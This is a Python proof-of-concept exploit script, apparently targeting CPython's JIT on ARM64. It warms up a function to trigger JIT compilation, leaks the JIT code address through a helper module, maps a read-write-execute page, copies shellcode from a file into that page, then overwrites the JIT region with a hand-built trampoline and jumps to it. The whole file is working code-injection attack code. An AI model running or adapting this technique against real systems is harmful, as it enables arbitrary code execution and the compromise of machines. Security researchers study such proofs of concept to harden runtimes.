import ctypes
import mmap
import struct
import jitexecleak

# Constants
PROT_READ = 1
PROT_WRITE = 2
PROT_EXEC = 4
MAP_PRIVATE = 2
MAP_ANONYMOUS = 0x20
PAGE_SIZE = 0x1000

libc = ctypes.CDLL("libc.so.6")
libc.mmap.restype = ctypes.c_void_p

# Step 1: Trigger JIT
def hot_loop(x):
    acc = 0
    for _ in range(100_000):
        acc ^= x + 7
    return acc

print("[*] Triggering JIT...")
for _ in range(1000):
    hot_loop(42)

jit_addr = jitexecleak.leak_executor_jit(hot_loop)
print(f"[+] executor->jit_code: 0x{jit_addr:x}")

# Step 2: Allocate RWX mmap region for payload
mmap_addr = libc.mmap(None, PAGE_SIZE, PROT_READ | PROT_WRITE | PROT_EXEC,
                      MAP_PRIVATE | MAP_ANONYMOUS, -1, 0)
if mmap_addr in (0, -1):
    raise RuntimeError("[-] mmap failed")

print(f"[+] RWX mmap allocated at: 0x{mmap_addr:x}")

# Step 3: Load real shellcode
with open("shellcode.bin", "rb") as f:
    shellcode = f.read()

ctypes.memmove(mmap_addr, shellcode, len(shellcode))
print("[*] Shellcode written to RWX mmap")

# Step 4: Build trampoline shellcode directly (ARM64 opcodes)
# ldr x16, [pc, #8] → 0x58000010
# br x16            → 0xd61f0200
# QWORD literal     → mmap_addr

trampoline = (
    b"\x10\x00\x00\x58" +                   # ldr x16, #8
    b"\x00\x02\x1f\xd6" +                   # br x16
    struct.pack("<Q", mmap_addr)           # target address
)

print(f"[*] Trampoline shellcode (hex): {trampoline.hex()}")

# Step 5: Inject trampoline into JIT code region
trampoline_buf = ctypes.create_string_buffer(bytes(trampoline), len(trampoline))
ctypes.memmove(jit_addr, trampoline_buf, len(trampoline))
print("[*] Trampoline injected into JIT region")

# Step 6: GDB optional pause
input("[*] Attach GDB now (optional), then press ENTER to execute...")

# Step 7: Execute trampoline → payload jump
FUNC = ctypes.CFUNCTYPE(None)
fn = FUNC(jit_addr)
print("[*] Jumping to trampoline...")
fn()
